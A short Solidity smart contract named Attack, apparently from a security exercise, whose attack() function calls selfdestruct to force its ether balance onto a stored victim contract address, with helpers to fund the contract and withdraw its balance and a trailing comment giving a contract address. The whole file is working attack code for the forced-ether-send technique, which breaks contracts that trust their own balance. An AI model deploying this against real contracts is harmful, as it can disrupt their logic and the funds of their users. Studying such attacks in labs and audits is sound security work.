///SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.0;

contract Attack {

    address victimAddr;

    constructor(address _victimAddr) {
        victimAddr = _victimAddr;
    }

    function attack() public payable {

        address payable addr = payable(address(victimAddr));
        selfdestruct(addr);
    }

    function sendEtherToContract() public payable returns (bool) {
        require(msg.value > 0 );
        bool success = address(this).balance >0;
        return success;
    }

    function sendBalanceBack() public returns(bool){
        payable(msg.sender).transfer(address(this).balance);
        if (address(this).balance == 0) {
            return true;
        }
        else
        {
            return false;
        }
    }

    receive() external payable {}

}

//0x651adD125703A64efdC397B4AE05d8691417162d